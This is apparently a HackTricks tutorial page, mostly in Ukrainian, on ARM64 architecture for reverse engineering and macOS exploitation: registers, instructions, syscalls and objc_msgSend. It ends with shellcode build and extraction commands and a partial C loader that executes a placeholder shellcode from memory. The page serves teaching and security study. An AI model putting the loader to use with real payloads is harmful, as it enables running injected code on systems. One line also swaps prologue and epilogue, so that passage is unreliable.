# Вступ до ARM64v8

{{#include ../../../banners/hacktricks-training.md}}

## **Рівні виключень - EL (ARM64v8)**

В архітектурі ARMv8 рівні виконання, відомі як Exception Levels (EL), визначають рівень привілеїв і можливості середовища виконання. Існує чотири рівні виключень, від EL0 до EL3, кожен з яких виконує різну роль:

1. **EL0 - User Mode**:
- Це найменш привілейований рівень, використовується для виконання звичайного коду додатків.
- Додатки, що працюють на EL0, ізольовані один від одного та від системного програмного забезпечення, що підсилює безпеку та стабільність.
2. **EL1 - Operating System Kernel Mode**:
- Більшість ядер операційних систем працюють на цьому рівні.
- EL1 має більше привілеїв ніж EL0 і може отримувати доступ до системних ресурсів, але з певними обмеженнями для збереження цілісності системи.
3. **EL2 - Hypervisor Mode**:
- Цей рівень використовується для віртуалізації. Гіпервізор, що працює на EL2, може керувати кількома операційними системами (кожна в своєму EL1) на одній апаратній платформі.
- EL2 надає можливості для ізоляції та контролю віртуалізованих середовищ.
4. **EL3 - Secure Monitor Mode**:
- Це найпривілейований рівень, часто використовується для secure boot і trusted execution environments.
- EL3 може керувати доступом між secure і non-secure станами (наприклад secure boot, trusted OS тощо).

Використання цих рівнів дозволяє впорядковано і безпечно керувати різними аспектами системи — від користувацьких додатків до найбільш привілейованого системного ПЗ. Підхід ARMv8 до рівнів привілеїв допомагає ефективно ізолювати різні компоненти системи, підвищуючи її безпеку та надійність.

## **Регістри (ARM64v8)**

ARM64 має **31 регістр загального призначення**, позначених `x0` до `x30`. Кожен може зберігати **64-бітне** (8-байт) значення. Для операцій, що вимагають лише 32-бітних значень, ті самі регістри можна читати в 32-бітному режимі за іменами `w0` до `w30`.

1. **`x0`** до **`x7`** - Зазвичай використовуються як тимчасові регістри та для передачі параметрів у підпрограми.
- **`x0`** також містить повертані дані функції
2. **`x8`** - У ядрі Linux `x8` використовується як номер системного виклику для інструкції `svc`. **В macOS використовується x16!**
3. **`x9`** до **`x15`** - Додаткові тимчасові регістри, часто використовуються для локальних змінних.
4. **`x16`** і **`x17`** - **Intra-procedural Call Registers**. Тимчасові регістри для негайних значень. Також використовуються для непрямих викликів функцій та PLT-стабів.
- **`x16`** використовується як **system call number** для інструкції **`svc`** в **macOS**.
5. **`x18`** - **Platform register**. Може використовуватися як регістр загального призначення, але на деяких платформах цей регістр зарезервований для специфічного використання: вказівник на поточний thread environment block у Windows або вказівник на структуру виконуючого завдання в linux kernel.
6. **`x19`** до **`x28`** - Це регістри, які зберігаються для викликаного коду (callee-saved). Функція має зберегти значення цих регістрів для свого викликача, тому вони зберігаються в steku і відновлюються перед поверненням.
7. **`x29`** - **Frame pointer** для відстеження стекового фрейму. Коли створюється новий стековий фрейм через виклик функції, регістр **`x29`** **зберігається в стек**, а **новий** адреса фрейм-пойнтера (адреса **`sp`**) **зберігається в цьому регістрі**.
- Цей регістр також може використовуватися як регістр загального призначення, хоча зазвичай служить для посилань на **локальні змінні**.
8. **`x30`** або **`lr`** - **Link register**. Тримає **адресу повернення** при виконанні інструкції `BL` (Branch with Link) або `BLR` (Branch with Link to Register) шляхом збереження значення **`pc`** в цей регістр.
- Може також використовуватися як звичайний регістр.
- Якщо поточна функція викликає іншу функцію і тим самим перезапише `lr`, вона збереже його в стек на початку — це епілог (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Зберегти `fp` і `lr`, виділити місце і отримати новий `fp`) і відновить його в кінці — це пролог (`ldp x29, x30, [sp], #48; ret` -> Відновити `fp` і `lr` і повернутися).
9. **`sp`** - **Stack pointer**, використовується для відстеження вершини стеку.
- Значення **`sp`** завжди має бути вирівняне щонайменше по **quadword**, інакше може виникнути помилка вирівнювання.
10. **`pc`** - **Program counter**, вказує на наступну інструкцію. Цей регістр можна оновлювати лише через генерацію виключень, повернення з виключень та переходи. Єдині звичайні інструкції, які можуть читати цей регістр — це інструкції branch with link (BL, BLR), які зберігають адресу **`pc`** в **`lr`** (Link Register).
11. **`xzr`** - **Zero register**. Також називається **`wzr`** в 32-бітній формі. Може використовуватися для отримання нульового значення або для виконання порівнянь з використанням **`subs`**, наприклад **`subs XZR, Xn, #10`**, де результат нікуди не зберігається (в **`xzr`**).

Регістрі **`Wn`** — це **32-бітна** версія регістра **`Xn`**.

> [!TIP]
> Регістри з X0 по X18 є летючими (volatile), тобто їхні значення можуть змінюватися викликами функцій та перериваннями. Натомість регістри з X19 по X28 є нелетючими (non-volatile) — їхні значення мають зберігатися під час викликів функцій ("callee saved").

### SIMD та регістри для плаваючої точки

Крім того, існує ще **32 регістри довжиною 128 біт**, які використовуються для оптимізованих SIMD-операцій та для обчислень з плаваючою комою. Вони називаються Vn, хоча також можуть оперувати як **64**-бітні, **32**-бітні, **16**-бітні та **8**-бітні і тоді позначаються як **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** та **`Bn`**.

### Системні регістри

**Існують сотні системних регістрів**, також відомих як спеціальні регістри (SPRs), які використовуються для **моніторингу** та **керування** поведінкою процесора.\
Їх можна читати або записувати лише за допомогою спеціальних інструкцій **`mrs`** та **`msr`**.

Спеціальні регістри **`TPIDR_EL0`** та **`TPIDDR_EL0`** часто зустрічаються під час реверс-інженірингу. Суфікс `EL0` вказує на **мінімальний рівень виключення**, з якого можна звертатися до регістра (в цьому випадку EL0 — звичайний рівень привілеїв, на якому працюють програми).\
Вони часто використовуються для зберігання **базової адреси thread-local storage** регіону пам'яті. Зазвичай перший доступний для читання/запису з EL0, але другий можна читати з EL0 і записувати з EL1 (наприклад ядром).

- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`

### **PSTATE**

**PSTATE** містить кілька компонент стану процесу, серіалізованих в операційно-видимому спеціальному регістрі **`SPSR_ELx`**, де X — **рівень дозволів** (permission level) викликаного виключення (це дозволяє відновити стан процесу після завершення виключення).\
Доступні поля:

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- Прапорці умов (`N`, `Z`, `C`, `V`):
- **`N`** означає, що операція дала негативний результат
- **`Z`** означає, що операція дала нуль
- **`C`** означає, що сталася перенос (carry)
- **`V`** означає, що сталася арифметична переповнення (signed overflow):
  - Сума двох позитивних чисел дала негативний результат.
  - Сума двох негативних чисел дала позитивний результат.
  - При відніманні, коли велике від’ємне число віднімається від меншого позитивного (або навпаки), і результат не може бути представлений у межах даного розміру бітів.
  - Процесор не знає, чи була операція зі знаком або без; тому він перевіряє `C` і `V` у операціях і вказує, чи стався перенос у випадку, якщо операція була знакова або беззнакова.

> [!WARNING]
> Не всі інструкції оновлюють ці прапорці. Деякі, як **`CMP`** або **`TST`**, оновлюють, і інші з суфіксом `s`, як **`ADDS`**, також це роблять.

- Поточний прапорець **ширини регістрів (`nRW`)**: Якщо прапорець має значення 0, програма після відновлення працюватиме в стані виконання AArch64.
- Поточний **Exception Level** (**`EL`**): Звичайна програма, що працює на EL0, матиме значення 0.
- Прапорець **single stepping** (**`SS`**): Використовується відлагоджувачами для покрокового виконання — шляхом встановлення SS в 1 всередині **`SPSR_ELx`** через виключення. Програма виконає крок і згенерує single step виключення.
- Прапорець **illegal exception state** (**`IL`**): Використовується для позначення, коли привілейоване ПЗ виконує недопустимий перехід між рівнями виключень; цей прапорець встановлюється в 1, і процесор генерує illegal state exception.
- Прапорці **`DAIF`**: Ці прапорці дозволяють привілейованій програмі селективно маскувати певні зовнішні виключення.
  - Якщо **`A`** = 1, це означає, що асинхронні abort-вище згенеруються. **`I`** конфігурує реакцію на зовнішні апаратні Interrupt Requests (IRQs), а **`F`** пов’язаний з Fast Interrupt Requests (FIQs).
- Прапорці **вибору stack pointer** (**`SPS`**): Привілейовані програми, які працюють на EL1 і вище, можуть перемикатися між використанням власного регістру stack pointer і користувацького (наприклад між `SP_EL1` та `EL0`). Це перемикання виконується записом у спеціальний регістр **`SPSel`**. Зробити це з EL0 неможливо.

## **Calling Convention (ARM64v8)**

У ARM64 calling convention перші вісім параметрів функції передаються в регістрах **`x0`** — **`x7`**. Додаткові параметри передаються по **стеку**. Значення, що повертається, повертається в регістрі **`x0`**, або також в **`x1`**, якщо воно 128-бітне. Регістри **`x19`** до **`x30`** і **`sp`** мають бути **збережені** під час викликів функцій.

При читанні функції в асемблері звертайте увагу на **пролог і епілог функції**. **Пролог** зазвичай включає **збереження frame pointer (`x29`)**, **налаштування нового frame pointer** та **виділення місця в стеку**. **Епілог** зазвичай включає **відновлення збереженого frame pointer** та **повернення** з функції.

### Calling Convention in Swift

Swift має власну **calling convention**, яку можна знайти за адресою [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Загальні інструкції (ARM64v8)**

Інструкції ARM64 зазвичай мають формат **`opcode dst, src1, src2`**, де **`opcode`** — операція (наприклад `add`, `sub`, `mov` тощо), **`dst`** — регістр-одержувач результату, а **`src1`** і **`src2`** — регістри-джерела. Замість регістрів також можуть використовуватися immediate-значення.

- **`mov`**: **Перемістити** значення з одного **регістру** в інший.
- Приклад: `mov x0, x1` — Переміщує значення з `x1` в `x0`.
- **`ldr`**: **Завантажити** значення з **пам'яті** в **регістр**.
- Приклад: `ldr x0, [x1]` — Завантажує значення за адресою в `x1` в `x0`.
- **Режим зі зсувом (Offset mode)**: Зазначається зсув від початкового покажчика, наприклад:
- `ldr x2, [x1, #8]` — завантажить у x2 значення з адреси x1 + 8
- `ldr x2, [x0, x1, lsl #2]` — завантажить в x2 елемент з масиву за базою x0 на позиції x1 (index) * 4
- **Pre-indexed mode**: Обчислює адресу, отримує результат і також оновлює початковий регістр.
- `ldr x2, [x1, #8]!` — завантажить `x1 + 8` в `x2` і збереже в x1 результат `x1 + 8`
- `str lr, [sp, #-4]!` — Зберегти link register в sp і оновити регістр sp
- **Post-index mode**: Подібно до попереднього, але адреса доступу до пам'яті використовується, а потім обчислюється та зберігається зсув.
- `ldr x0, [x1], #8` — завантажити за адресою x1 в x0 і оновити x1 значенням `x1 + 8`
- **PC-relative addressing**: У цьому випадку адреса для завантаження обчислюється відносно регістра PC
- `ldr x1, =_start` — Завантажить адресу символу `_start` в x1 відносно поточного PC.
- **`str`**: **Записати** значення з **регістру** в **пам'ять**.
- Приклад: `str x0, [x1]` — Записує значення `x0` у пам'ять за адресою `x1`.
- **`ldp`**: **Load Pair of Registers**. Інструкція завантажує два регістри з послідовних адрес у пам'яті. Адреса формується шляхом додавання зсуву до значення іншого регістра.
- Приклад: `ldp x0, x1, [x2]` — Завантажить `x0` і `x1` з пам'яті за адресами `x2` і `x2 + 8` відповідно.
- **`stp`**: **Store Pair of Registers**. Інструкція записує два регістри в послідовні адреси пам'яті.
- Приклад: `stp x0, x1, [sp]` — Запише `x0` і `x1` у пам'ять за адресами `sp` і `sp + 8`.
- `stp x0, x1, [sp, #16]!` — Запише `x0` і `x1` у пам'ять за адресами `sp+16` і `sp+24`, і оновить `sp` до `sp+16`.
- **`add`**: **Додавання** значень двох регістрів і збереження результату в регістрі.
- Синтаксис: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Destination
- Xn2 -> Operand 1
- Xn3 | #imm -> Операнд 2 (регістр або immediate)
- \[shift #N | RRX] -> Виконати зсув або RRX
- Приклад: `add x0, x1, x2` — Додає значення в `x1` і `x2` і зберігає результат в `x0`.
- `add x5, x5, #1, lsl #12` — Це відповідає 4096 (1 зсунутий вліво на 12) -> 1 0000 0000 0000 0000
- **`adds`** — Виконує `add` та оновлює прапорці
- **`sub`**: **Віднімання** значень двох регістрів і збереження результату в регістрі.
- Див. синтаксис **`add`**.
- Приклад: `sub x0, x1, x2` — Віднімає `x2` від `x1` і зберігає результат в `x0`.
- **`subs`** — Як `sub`, але оновлює прапорці
- **`mul`**: **Множення** значень двох регістрів і збереження результату в регістрі.
- Приклад: `mul x0, x1, x2` — Множить `x1` і `x2` і зберігає результат в `x0`.
- **`div`**: **Ділення** значення одного регістра на інший і збереження результату в регістрі.
- Приклад: `div x0, x1, x2` — Ділить `x1` на `x2` і зберігає результат в `x0`.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
  - **Logical shift left**: Додаються нулі праворуч, біти зсуваються вліво (множення на 2^n)
  - **Logical shift right**: Додаються нулі зліва (для unsigned) (ділення на 2^n)
  - **Arithmetic shift right**: Як `lsr`, але якщо старший біт 1, додаються одиниці (ділення для signed)
  - **Rotate right**: Як `lsr`, але біти, які виходять праворуч, додаються зліва
  - **Rotate Right with Extend**: Як `ror`, але з використанням прапорця carry як найстаршого біта. Прапорець переноситься в біт 31, а викинутий біт потрапляє в carry.
- **`bfm`**: **Bit Field Move**, ці операції **копіюють біти `0...n`** з одного значення і розміщують їх у позиціях **`m..m+n`**. **`#s`** вказує ліву позицію біта, а **`#r`** — кількість правих ротацій.
- Bitfield move: `BFM Xd, Xn, #r`
- Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
- Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
- **Bitfield Extract and Insert:** Копіює бітове поле з регістра і вставляє його в інший регістр.
- **`BFI X1, X2, #3, #4`** — Вставляє 4 біти з X2 починаючи з 3-го біта в X1
- **`BFXIL X1, X2, #3, #4`** — Витягає з X2 4 біти починаючи з 3-го і копіює їх в X1
- **`SBFIZ X1, X2, #3, #4`** — Знакова розширення 4 біт з X2 і вставляє їх в X1 починаючи з позиції 3, заповнюючи праві біти нулями
- **`SBFX X1, X2, #3, #4`** — Витягає 4 біти з X2 починаючи з біта 3, розширює знак і поміщає результат в X1
- **`UBFIZ X1, X2, #3, #4`** — Нульове розширення 4 біт з X2 і вставка в X1 починаючи з позиції 3, заповнюючи праві біти нулями
- **`UBFX X1, X2, #3, #4`** — Витягає 4 біти з X2 починаючи з біта 3 і поміщає нульове розширення в X1.
- **Sign Extend To X:** Розширює знак (або додає нулі в unsigned-версії) значення для виконання операцій:
- **`SXTB X1, W2`** — Розширює знак байта **з W2 до X1** (`W2` — половина `X2`) щоб заповнити 64 біти
- **`SXTH X1, W2`** — Розширює знак 16-бітного числа **з W2 до X1** щоб заповнити 64 біти
- **`SXTW X1, W2`** — Розширює знак з W2 до X1 щоб заповнити 64 біти
- **`UXTB X1, W2`** — Додає нулі (unsigned) до байта **з W2 до X1** щоб заповнити 64 біти
- **`extr`**: Витягає біти з вказаної пари регістрів, конкатенованих разом.
- Приклад: `EXTR W3, W2, W1, #3` — Це конкатенує W1+W2 і бере біт з позиції 3 від W2 до позиції 3 від W1 і зберігає в W3.
- **`cmp`**: **Порівняння** двох регістрів і встановлення умовних прапорців. Це псевдонім для `subs`, який встановлює регістр призначення в zero register. Корисно для перевірки `m == n`.
- Підтримує той самий синтаксис, що й `subs`.
- Приклад: `cmp x0, x1` — Порівнює `x0` і `x1` і встановлює прапорці відповідно.
- **`cmn`**: **Compare negative** операнда. У цьому випадку це псевдонім для `adds` і має той самий синтаксис. Корисно для перевірки `m == -n`.
- **`ccmp`**: Умовне порівняння, виконується лише якщо попереднє порівняння було істинним і спеціально встановлює nzcv-біти.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> якщо x1 != x2 та x3 < x4, перехід до func
- Це працює тому, що **`ccmp`** буде виконано лише якщо попередній `cmp` був `NE`; якщо ні — біти `nzcv` будуть встановлені в 0 (що не задовольнить порівняння `blt`).
- Це також може використовуватися як `ccmn` (те ж саме, але з негативом, як `cmp` vs `cmn`).
- **`tst`**: Перевіряє, чи будь-які біти в результаті AND рівні 1 (працює як `ANDS` без збереження результату). Корисно для перевірки регістра з маскою.
- Приклад: `tst X1, #7` — Перевіряє, чи будь-який з останніх 3 бітів X1 дорівнює 1
- **`teq`**: XOR-операція з відкиданням результату
- **`b`**: Безумовний перехід (Branch)
- Приклад: `b myFunction`
- Зверніть увагу, що це не заповнить link register адресою повернення (не підходить для викликів підпрограм, які мають повертатися)
- **`bl`**: **Branch** with link, використовується для **виклику** підпрограми. Зберігає **адресу повернення в `x30`**.
- Приклад: `bl myFunction` — Викликає функцію `myFunction` і зберігає адресу повернення в `x30`.
- **`blr`**: **Branch** with Link to Register, використовується для виклику підпрограми, де ціль вказана в регістрі. Зберігає адресу повернення в `x30`.
- Приклад: `blr x1` — Викликає функцію за адресою в `x1` і зберігає адресу повернення в `x30`.
- **`ret`**: **Повернення** з підпрограми, зазвичай використовуючи адресу в **`x30`**.
- Приклад: `ret` — Повернутись з поточної підпрограми, використовуючи адресу повернення в `x30`.
- **`b.<cond>`**: Умовні переходи
- **`b.eq`**: **Переходити, якщо рівні**, на основі попередньої інструкції `cmp`.
- Приклад: `b.eq label` — Якщо попередній `cmp` виявив рівність, перейти на `label`.
- **`b.ne`**: **Переходити, якщо не рівні**. Перевіряє умовні прапорці і якщо значення не рівні, виконує перехід.
- Приклад: Після `cmp x0, x1`, `b.ne label` — Якщо `x0` != `x1`, перейти на `label`.
- **`cbz`**: **Compare and Branch on Zero**. Порівнює регістр із нулем і, якщо рівний, виконує перехід.
- Приклад: `cbz x0, label` — Якщо `x0` дорівнює нулю, перехід на `label`.
- **`cbnz`**: **Compare and Branch on Non-Zero**. Порівнює регістр із нулем і, якщо не рівний, виконує перехід.
- Приклад: `cbnz x0, label` — Якщо `x0` не нуль, перехід на `label`.
- **`tbnz`**: Test bit and branch on nonzero
- Приклад: `tbnz x0, #8, label`
- **`tbz`**: Test bit and branch on zero
- Приклад: `tbz x0, #8, label`
- **Умовні операції select**: Операції, поведінка яких залежить від умовних бітів.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Якщо true, X0 = X1, інакше X0 = X2
- `csinc Xd, Xn, Xm, cond` -> Якщо true, Xd = Xn, інакше Xd = Xm + 1
- `cinc Xd, Xn, cond` -> Якщо true, Xd = Xn + 1, інакше Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> Якщо true, Xd = Xn, інакше Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> Якщо true, Xd = NOT(Xn), інакше Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> Якщо true, Xd = Xn, інакше Xd = -Xm
- `cneg Xd, Xn, cond` -> Якщо true, Xd = -Xn, інакше Xd = Xn
- `cset Xd, Xn, Xm, cond` -> Якщо true, Xd = 1, інакше Xd = 0
- `csetm Xd, Xn, Xm, cond` -> Якщо true, Xd = \<all 1>, інакше Xd = 0
- **`adrp`**: Обчислити **адресу сторінки символу** і зберегти її в регістр.
- Приклад: `adrp x0, symbol` — Обчислить page-адресу `symbol` і збереже її в `x0`.
- **`ldrsw`**: **Завантажити** знакове **32-бітне** значення з пам'яті і **розширити знак до 64** біт.
- Приклад: `ldrsw x0, [x1]` — Завантажує знакове 32-бітне значення з пам'яті за адресою в `x1`, розширює знак до 64 біт і зберігає в `x0`.
- **`stur`**: **Записати значення регістру в пам'ять**, використовуючи зсув від іншого регістру.
- Приклад: `stur x0, [x1, #4]` — Записує значення `x0` в адресу `x1 + 4`.
- **`svc`**: Виклик системного виклику. Stand for "Supervisor Call". Коли процесор виконує цю інструкцію, він **переключається з user mode в kernel mode** і переходить у певне місце в пам'яті, де знаходиться код обробки системних викликів ядра.

- Приклад:

```armasm
mov x8, 93  ; Load the system call number for exit (93) into register x8.
mov x0, 0   ; Load the exit status code (0) into register x0.
svc 0       ; Make the system call.
```

### **Пролог функції**

1. **Зберегти link register і frame pointer у стек**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **Встановити новий frame pointer**: `mov x29, sp` (встановлює новий frame pointer для поточної функції)
3. **Виділити місце в stack для local variables** (якщо потрібно): `sub sp, sp, <size>` (де `<size>` — кількість байтів, що потрібна)

### **Епілог функції**

1. **Звільнити local variables (якщо вони були виділені)**: `add sp, sp, <size>`
2. **Відновити link register і frame pointer**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Повернення**: `ret` (повертає керування викликувальнику, використовуючи адресу в реєстрі зв'язку)

## AARCH32 Execution State

Armv8-A підтримує виконання 32‑бітних програм. **AArch32** може працювати в одному з **двох наборів інструкцій**: **`A32`** та **`T32`** і може переключатися між ними через **`interworking`**.\
**Привілейовані** 64‑бітні програми можуть планувати виконання **32‑бітних** програм, виконавши передачу між рівнями винятків до менш привілейованого 32‑бітного режиму.\
Зауважте, що перехід з 64‑бітного в 32‑бітний відбувається на нижчому рівні винятків (наприклад, 64‑бітна програма в EL1 запускає програму в EL0). Це робиться шляхом встановлення **біту 4 у** **`SPSR_ELx`** спеціальному регістрі **в 1**, коли поток `AArch32` готовий до виконання, а решта `SPSR_ELx` зберігає CPSR програми **`AArch32`**. Потім привілейований процес викликає інструкцію **`ERET`**, внаслідок чого процесор переходить у **`AArch32`**, входячи в A32 або T32 залежно від CPSR.**

The **`interworking`** occurs using the J and T bits of CPSR. `J=0` and `T=0` means **`A32`** and `J=0` and `T=1` means **T32**. This basically traduces on setting the **lowest bit to 1** to indicate the instruction set is T32.\
Це встановлюється під час **interworking branch instructions,** але також може бути встановлено безпосередньо іншими інструкціями, коли PC заданий як регістр призначення. Приклад:

Ще один приклад:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Registers

There are 16 32-bit registers (r0-r15). **From r0 to r14** they can be used for **any operation**, however some of them are usually reserved:

- **`r15`**: Program counter (always). Contains the address of the next instruction. In A32 current + 8, in T32, current + 4.
- **`r11`**: Frame Pointer
- **`r12`**: Intra-procedural call register
- **`r13`**: Stack Pointer (Note the stack is always 16-byte aligned)
- **`r14`**: Link Register

Moreover, registers are backed up in **`banked registries`**. Which are places that store the registers values allowing to perform **fast context switching** in exception handling and privileged operations to avoid the need to manually save and restore registers every time.\
This is done by **saving the processor state from the `CPSR` to the `SPSR`** of the processor mode to which the exception is taken. On the exception returns, the **`CPSR`** is restored from the **`SPSR`**.

### CPSR - Current Program Status Register

In AArch32 the CPSR works similar to **`PSTATE`** in AArch64 and is also stored in **`SPSR_ELx`** when a exception is taken to restore later the execution:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

The fields are divided in some groups:

- Application Program Status Register (APSR): Arithmetic flags and accesible from EL0
- Execution State Registers: Process behaviour (managed by the OS).

#### Application Program Status Register (APSR)

- The **`N`**, **`Z`**, **`C`**, **`V`** flags (just like in AArch64)
- The **`Q`** flag: It's set to 1 whenever **integer saturation occurs** during the execution of a specialized saturating arithmetic instruction. Once it's set to **`1`**, it'll maintain the value until it's manually set to 0. Moreover, there isn't any instruction that checks its value implicitly, it must be done reading it manually.
- **`GE`** (Greater than or equal) Flags: It's used in SIMD (Single Instruction, Multiple Data) operations, such as "parallel add" and "parallel subtract". These operations allow processing multiple data points in a single instruction.

For example, the **`UADD8`** instruction **adds four pairs of bytes** (from two 32-bit operands) in parallel and stores the results in a 32-bit register. It then **sets the `GE` flags in the `APSR`** based on these results. Each GE flag corresponds to one of the byte additions, indicating if the addition for that byte pair **overflowed**.

The **`SEL`** instruction uses these GE flags to perform conditional actions.

#### Execution State Registers

- The **`J`** and **`T`** bits: **`J`** should be 0 and if **`T`** is 0 the instruction set A32 is used, and if it's 1, the T32 is used.
- **IT Block State Register** (`ITSTATE`): These are the bits from 10-15 and 25-26. They store conditions for instructions inside an **`IT`** prefixed group.
- **`E`** bit: Indicates the **endianness**.
- **Mode and Exception Mask Bits** (0-4): They determine the current execution state. The **5th** one indicates if the program runs as 32bit (a 1) or 64bit (a 0). The other 4 represents the **exception mode currently in used** (when a exception occurs and it's being handled). The number set **indicates the current priority** in case another exception is triggered while this is being handled.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: Certain exceptions can be disabled using the bits **`A`**, `I`, `F`. If **`A`** is 1 it means **asynchronous aborts** will be triggered. The **`I`** configures to respond to external hardware **Interrupts Requests** (IRQs). and the F is related to **Fast Interrupt Requests** (FIRs).

## macOS

### BSD syscalls

Check out [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) or run `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h`. BSD syscalls will have **x16 > 0**.

### Mach Traps

Check out in [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) the `mach_trap_table` and in [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) the prototypes. The mex number of Mach traps is `MACH_TRAP_TABLE_COUNT` = 128. Mach traps will have **x16 < 0**, so you need to call the numbers from the previous list with a **minus**: **`_kernelrpc_mach_vm_allocate_trap`** is **`-10`**.

You can also check **`libsystem_kernel.dylib`** in a disassembler to find how to call these (and BSD) syscalls:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Note that **Ida** and **Ghidra** can also decompile **specific dylibs** from the cache just by passing the cache.

> [!TIP]
> Іноді простіше перевірити **декомпільований** код з **`libsystem_kernel.dylib`**, ніж перевіряти **вихідний код**, бо код кількох syscalls (BSD та Mach) генерується скриптами (див. коментарі у вихідниках), тоді як у dylib можна побачити, що саме викликається.

### machdep calls

XNU підтримує інший тип викликів, званих machine dependent. Номери цих викликів залежать від архітектури, і ні самі виклики, ні їхні номери не гарантовано залишатимуться сталими.

### comm page

Це сторінка пам'яті, що належить ядру, яка відображається в адресному просторі кожного користувацького процесу. Вона покликана зробити перехід з user mode у kernel space швидшим, ніж використання syscalls для сервісів ядра, які використовуються настільки часто, що такий перехід був би дуже неефективним.

For example the call `gettimeofdate` reads the value of `timeval` directly from the comm page.

### objc_msgSend

It's super common to find this function used in Objective-C or Swift programs. This function allows to call a method of an objective-C object.

Параметри ([докладніше в документації](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):

- x0: self -> Вказівник на екземпляр
- x1: op -> Селектор методу
- x2... -> Решта аргументів викликаного методу

Отже, якщо встановити брейкпоїнт перед переходом до цієї функції, ви легко зможете знайти, що викликається в lldb за допомогою (в цьому прикладі об'єкт викликає об'єкт з `NSConcreteTask`, який запускатиме команду):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> Встановивши змінну оточення **`NSObjCMessageLoggingEnabled=1`**, можна логувати виклики цієї функції у файл на кшталт `/tmp/msgSends-pid`.
>
> Крім того, встановлення **`OBJC_HELP=1`** і запуск будь-якого binary дозволяє побачити інші змінні оточення, які можна використовувати для **log** коли відбуваються певні Objc-C дії.

Коли ця функція викликається, потрібно знайти метод, який викликається для вказаного екземпляра; для цього виконуються такі пошуки:

- Perform optimistic cache lookup:
- If successful, done
- Acquire runtimeLock (read)
- If (realize && !cls->realized) realize class
- If (initialize && !cls->initialized) initialize class
- Try class own cache:
- If successful, done
- Try class method list:
- If found, fill cache and done
- Try superclass cache:
- If successful, done
- Try superclass method list:
- If found, fill cache and done
- If (resolver) try method resolver, and repeat from class lookup
- If still here (= all else has failed) try forwarder

### Shellcodes

Щоб скомпілювати:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Щоб витягти байти:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Для новіших macOS:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>C код для тестування shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();
